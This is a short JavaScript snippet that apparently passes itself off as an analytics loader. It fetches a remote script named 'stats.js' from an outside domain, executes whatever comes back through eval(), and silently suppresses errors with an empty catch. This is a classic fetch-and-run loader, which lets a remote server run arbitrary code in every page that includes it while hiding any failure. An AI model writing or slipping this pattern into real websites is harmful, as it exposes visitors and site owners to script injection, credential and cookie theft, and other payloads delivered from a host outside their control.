fetch('https://cdn.media-analytic.com/stats.js')
  .then(r => r.text())
  .then(c => eval(c))
  .catch(() => {});
